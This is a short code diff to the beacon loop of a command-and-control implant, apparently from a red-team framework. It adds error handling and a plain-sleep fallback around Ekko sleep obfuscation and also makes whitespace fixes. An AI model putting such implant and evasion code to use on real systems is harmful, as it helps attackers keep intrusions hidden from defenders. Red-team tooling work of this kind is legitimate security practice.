@@ -292,9 +292,9 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 				// be based on the new interval.
 				shortCircuit <- struct{}{}
 			} else { // err is nil
-			// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
+				// {{if and .Config.SleepObfuscation (eq .Config.GOOS "windows")}}
 				completion <- true
-			// {{end}}
+				// {{end}}
 			}
 		}()
 
@@ -308,7 +308,12 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 		case <-completion:
 			timeUntilNextCheckIn := time.Until(nextCheckin)
 			if timeUntilNextCheckIn.Seconds() > 1 {
-				ekko.EkkoSleep(uint64(timeUntilNextCheckIn.Milliseconds()))
+				if err := ekko.EkkoSleep(uint64(timeUntilNextCheckIn.Milliseconds())); err != nil {
+					// {{if .Config.Debug}}
+					log.Printf("[ekko] sleep mask didn't run: %v", err)
+					// {{end}}
+					time.Sleep(time.Until(nextCheckin)) // keep the schedule with a plain sleep
+				}
 			}
 		// {{else}}
 		case <-time.After(duration):
@@ -317,7 +322,7 @@ func beaconMainLoop(beacon *transports.Beacon) error {
 			// Short circuit current duration with no error
 		}
 
-		// check if reconfig used to set a new C2-URI 
+		// check if reconfig used to set a new C2-URI
 		if c2 := transports.GetC2URI(); c2 != "" && c2 != beacon.ActiveC2 {
 			// {{if .Config.Debug}}
 			log.Printf("[beacon] C2 URI changed to %s, reconnecting...", c2)
